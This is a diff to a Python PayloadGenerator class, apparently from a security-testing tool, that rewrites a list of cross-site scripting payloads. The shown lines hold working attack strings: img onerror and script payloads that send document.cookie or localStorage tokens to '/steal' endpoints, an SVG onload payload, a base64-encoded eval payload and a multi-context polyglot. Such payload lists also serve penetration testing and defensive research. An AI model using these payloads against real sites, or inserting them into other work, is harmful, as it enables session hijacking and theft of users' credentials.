@@ -384,7 +384,7 @@ class PayloadGenerator:
         elif attack_type == "xss":
             examples = [
                 {
-                    "payload": '{"user_bio": "<img src=\\"x\\" onerror=\\"fetch(\'/api/steal?d=\\'+document.cookie)\\">"}',
+                    "payload": '<img src="x" onerror="fetch(\'/api/steal?d=\'+document.cookie)">',
                     "explanation": "XSS payload in user profile field with data exfiltration",
                     "technique": "Profile field exploitation"
                 },
@@ -394,17 +394,17 @@ class PayloadGenerator:
                     "technique": "CSS URL injection"
                 },
                 {
-                    "payload": '{"custom_html": "<!-- User widget --><svg/onload=alert(document.domain)>"}',
+                    "payload": '<!-- User widget --><svg/onload=alert(document.domain)>',
                     "explanation": "SVG XSS in custom HTML feature",
                     "technique": "Custom HTML exploitation"
                 },
                 {
-                    "payload": '{"signature": "<img src=\\"profile.jpg\\" onload=\\"eval(atob(\'YWxlcnQoMSk=\'))\\">"}',
+                    "payload": '<img src="profile.jpg" onload="eval(atob(\'YWxlcnQoMSk=\'))">',
                     "explanation": "Encoded XSS in signature field",
                     "technique": "Signature injection"
                 },
                 {
-                    "payload": '{"notification_template": "Hello {{name}}<script>fetch(\'/steal?c=\\'+localStorage.token)</script>"}',
+                    "payload": 'Hello {{name}}<script>fetch(\'/steal?c=\'+localStorage.token)</script>',
                     "explanation": "XSS in template variable",
                     "technique": "Template injection"
                 }
@@ -530,7 +530,7 @@ class PayloadGenerator:
                 "contexts": ["multiple HTML contexts"]
             },
             {
-                "payload": '";alert(1)//\';alert(1)//";alert(1)//\\';alert(1)//--></script><script>alert(1)</script>',
+                "payload": '";alert(1)//\';alert(1)//";alert(1)//</script><script>alert(1)</script>',
                 "explanation": "Works in single quotes, double quotes, and multiple script contexts",
                 "technique": "Multi-quote polyglot",
                 "contexts": ["single-quote", "double-quote", "HTML"]
